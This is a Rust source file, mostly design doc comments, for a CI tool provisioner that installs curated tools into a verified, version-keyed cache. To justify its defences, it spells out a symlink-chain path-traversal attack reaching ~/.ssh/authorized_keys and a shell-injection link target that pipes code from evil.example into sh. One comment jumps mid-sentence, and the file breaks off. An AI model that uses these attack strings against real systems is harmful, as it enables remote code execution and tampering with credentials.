//! Toolchain provisioning for CI dispatches: install a tool named by a
//! `[[tools]]` declaration from a **closed, curated registry**, cache it
//! version-pinned, and hand its bin directory to the executor for the step
//! PATH.
//!
//! **Why this exists.** `ci_node/` installed nothing, so a repo whose Actions
//! gate runs `cargo nextest run` had to substitute plain `cargo test` on this
//! lane. That substitution is not cosmetic: nextest is what writes the JUnit
//! report coord's Tier-7 credibility gate ingests, and without a
//! `test_results` row `test_run_effects.rs::score_for_head` returns `None` and
//! the tier fails CLOSED. coord's own manifest calls that "a HARD BLOCKER for
//! cutover".
//!
//! # Why this module is an installer-strategy enum and not a URL builder
//!
//! The first entry (`cargo-nextest`) was a single prebuilt binary in a release
//! archive, and the module was shaped around exactly that: one asset URL, one
//! basename-matched file. Holding that shape literally cannot deliver what the
//! fleet's shipped manifests actually ask for. Of `poetry`, `npm`/`node`,
//! `twine` and `datamodel-code-generator`, only `node` ships as a prebuilt
//! release archive — and even that is a directory TREE (`bin/node`, `bin/npm`,
//! `lib/node_modules/npm/…`), not one file. qontinui's manifest records
//! poetry's real install as `curl -sSL https://install.python-poetry.org |
//! python3 -`; `twine` and `datamodel-code-generator` are Python *packages*.
//!
//! So [`Installer`] is an enum of install strategies, and the properties that
//! actually catch a bad install were made **universal — no per-variant
//! opt-out**:
//!
//! 1. **The registry stays CLOSED.** A manifest names a curated entry and pins
//!    a version. It cannot supply a URL, and it cannot supply an installer
//!    command — that would re-open the registry through the back door. A repo
//!    can already run arbitrary commands as a step, so this is not about what
//!    code can execute: it is about not letting a manifest make the RUNNER
//!    fetch an arbitrary payload, cache it under a well-known name, and put it
//!    on the PATH that later steps resolve implicitly. Adding an entry here is
//!    a deliberate, reviewable act.
//! 2. **Verification is by EXECUTION.** Every variant ends by running the
//!    installed tool and requiring it to report the declared version
//!    ([`version_is_reported`]). The projects here publish no checksum assets
//!    we could pin, and executing the artifact catches strictly more than a
//!    hash would anyway — truncation, a wrong-platform asset, a wrong-VERSION
//!    asset and a half-written venv all fail it, and the wrong-version case is
//!    invisible to any hash we could have computed ourselves.
//! 3. **Publication is by ATOMIC RENAME into the version-keyed cache**
//!    ([`tool_dir`]). Nothing is ever written directly at the cache path; a
//!    tool directory appears only by renaming a staging directory that has
//!    already passed verification. A partial download, a truncated archive, a
//!    failed `pip install` and a wrong-version asset all fail before the
//!    rename, and none of them can leave anything at the cache path. On a
//!    cache HIT the same verification runs again (it costs one process spawn)
//!    so a directory corrupted after the fact — a half-finished antivirus
//!    quarantine, a killed dispatch mid-rename — self-heals instead of
//!    producing a broken tool.
//!
//! Caching is safe here in a way sibling caching is not: the cache key is an
//! exact version, so a hit is by construction the same bytes a miss would
//! fetch.
//!
//! # The variants
//!
//! * [`Installer::PrebuiltBinary`] — the original nextest path, behaviour
//!   unchanged. Exactly ONE basename-matched file is pulled out of the archive
//!   and exactly one path is ever written, so the tar/zip-slip class is
//!   *structurally absent* rather than filtered.
//! * [`Installer::PrebuiltTree`] — node. A tree cannot use the one-file rule,
//!   so the equivalent structural guarantee is built from two parts. First,
//!   every entry path is validated BEFORE anything is opened:
//!   [`safe_tree_path`] rejects absolute paths, drive-qualified paths, `..`
//!   components and any entry outside the single expected top-level directory
//!   (which also rejects an archive smuggling in a second root); hard links
//!   and device nodes are refused outright. Second — and this is what makes
//!   the first part sound — **no symlink is ever created**. Link entries are
//!   recorded and materialised afterwards as launcher scripts
//!   ([`materialize_links`]), so every path the extractor opens runs through
//!   directories it created itself out of validated components and cannot be
//!   redirected. Filtering alone was NOT enough here: a two-link chain
//!   defeated the lexical containment check and produced an arbitrary write
//!   outside the root — the worked example is on
//!   [`symlink_target_is_contained`]. This variant additionally pins a
//!   reviewed **SHA-256 per (version, platform)**, checked before the
//!   extractor sees a byte, so a hostile archive never reaches the code above
//!   in the first place; a version with no reviewed digest is refused.
//! * [`Installer::PythonPackage`] — poetry, twine, datamodel-code-generator.
//!   Installed into a **private, version-keyed venv** under the tool cache.
//!   Never the user's global interpreter: qontinui's and qontinui-schemas'
//!   manifests both record a global `pip install` as unacceptable on a user's
//!   machine ("on an ephemeral Actions runner that is free; on a user's
//!   machine it mutates their interpreter permanently").
//!
//! # Node is a runtime with an ecosystem — and that lives in the REGISTRY
//!
//! The plan asked whether a registry entry provisions the runtime, the package
//! manager, or both, and noted `CiTool` has no shape for "node 22 **with**
//! npm". The answer taken here is: **the entry provisions both, and `CiTool`
//! stays a flat `{name, version}` pair.** A node release *is* an npm release —
//! npm's version is a property of the node build, not an independently
//! pinnable thing — so a second version field would be a knob with nothing on
//! the other end. `actions/setup-node` behaves the same way. What the entry
//! does carry is `companions`: npm and npx are checked to exist and to execute
//! after install, and their versions are logged, so "node was provisioned but
//! npm is missing" is a provisioning failure rather than a step failure ten
//! minutes later. A project's own dependency install (`npm ci`, `poetry
//! install`) stays a manifest STEP: it is repo-scoped, lockfile-pinned and
//! belongs in the worktree, not in a cross-dispatch tool cache.
//!
//! # Python: why a shim and not the venv's console scripts
//!
//! A venv's console scripts are **not relocatable** — on Windows the generated
//! `.exe` launcher embeds an absolute path to the venv's `python.exe`, and on
//! Unix the script's shebang does the same. Measured on this box 2026-08-18: a
//! venv with `poetry==2.1.3` moved to a new directory, then
//! `Scripts/poetry.exe --version` printed **nothing and exited 1**, while
//! `Scripts/python.exe -m poetry --version` still printed
//! `Poetry (version 2.1.3)`. A venv python invoked through its own path stays a
//! venv python (it finds `pyvenv.cfg` beside/above itself), so `-m` survives a
//! move; the console scripts do not. Since atomic rename into the cache is a
//! mandatory property, the console scripts cannot be what goes on PATH.
//!
//! So the entry writes its own launcher into `<tool_dir>/bin/`, and only that
//! directory is put on the step PATH (never the venv's `Scripts`/`bin`, which
//! would shadow the shim with the broken script). The shim locates the venv
//! **relative to its own location** — `%~dp0..` on Windows, `dirname "$0"/..`
//! elsewhere — so it is position-independent and the rename is safe. The
//! module it invokes is a curated per-entry field, and verification proves the
//! invocation actually works: an entry whose distribution has no `__main__`
//! fails provisioning loudly instead of landing a shim that silently does
//! nothing.
//!
//! **The shim's NAME is a third curated field, and it is the one consumers
//! see.** A Python distribution has a distribution name (what pip installs), a
//! module name (what `-m` imports) and a console-script name (what ends up on
//! PATH), and all three can differ. Naming the shim after the registry entry
//! looked right for `poetry` and `twine`, where all three agree, and was wrong
//! for `datamodel-code-generator`, whose only entry point is
//! `datamodel-codegen` — so the tool provisioned, verified and cached under a
//! name that appears nowhere in the fleet, and the gate it exists to unblock
//! (qontinui-schemas' `check-drift`, which probes for `datamodel-codegen` on
//! PATH) still failed. Verification runs the console-script name for the same
//! reason: proving a name nothing calls proves nothing.
//!
//! # No Python interpreter is a REFUSAL, never a skip
//!
//! [`Installer::PythonPackage`] needs a host Python 3 to build the venv from.
//! If none is found the dispatch **fails with a message naming what is
//! missing** and naming the candidates that were tried. It never falls back to
//! "the tool is probably on PATH already", and it never installs one: silence
//! is never success on this lane.

/// Lexical depth counting assumes every non-`..` segment is a real directory.
/// That assumption is false the moment a link's target traverses *through

/// 2. `R/d/up -> ..`        — depth 1 to 0, "contained"; `dest/d/up` IS `dest`.
/// 3. `R/d/hop -> up/..`    — depth 1 to 2 to 1, "contained"; but
///    `dest/d/up/..` is `dest/..`, one level OUTSIDE.
/// 4. `R/d/hop/evil` (file) — no `..`, under the root, so accepted; the write
///    follows `hop` and lands outside the extraction root.
///
/// Each further `hopN -> hopN-1/..` pair climbs another level, so a handful of
/// entries reach `$HOME` — `~/.ssh/authorized_keys`, `~/.bashrc`.
///
/// The fix is not a better filter. **No symlink is ever created under the
/// destination** (see [`extract_tree`]), so every path the extractor opens is
/// composed of validated `Normal` components over directories it created
/// itself, and `dest.join(rel)` cannot escape — structurally, not by
/// filtering. That also makes lexical equal to real for this function, because
/// there is no link on disk for a target to traverse through. This check now
/// governs only WHERE A LAUNCHER POINTS, which still matters: a launcher aimed
/// outside would exec an arbitrary host binary when a step runs `npm`.
///
/// # The charset is a SHELL-QUOTING property, not a path property
///
/// A contained target is not automatically a safe one. The materialised
/// launcher is a `/bin/sh` script that interpolates the target
/// ([`write_link_launcher`]), so a target of
/// `x"; curl -s evil.example/p | sh; "` contains no `..`, counts
/// depth-positive, and would pass every containment rule above while running
/// an attacker's pipeline every single time a step invokes `npm`. Containment
/// answers "where does this point"; it says nothing about what the characters
/// MEAN to a shell, and under this module's own threat model — which already
/// assumes a hostile archive, that being why containment exists at all — code
/// execution is strictly worse than the traversal it guards.
///
/// So the target is restricted to `[A-Za-z0-9._/-]`, in which no character is
/// special to `sh`. This is a rejection rather than an escaping scheme on
/// purpose: it keeps the launcher body a constant shape instead of making
/// correctness depend on getting quoting right. All three link targets in the
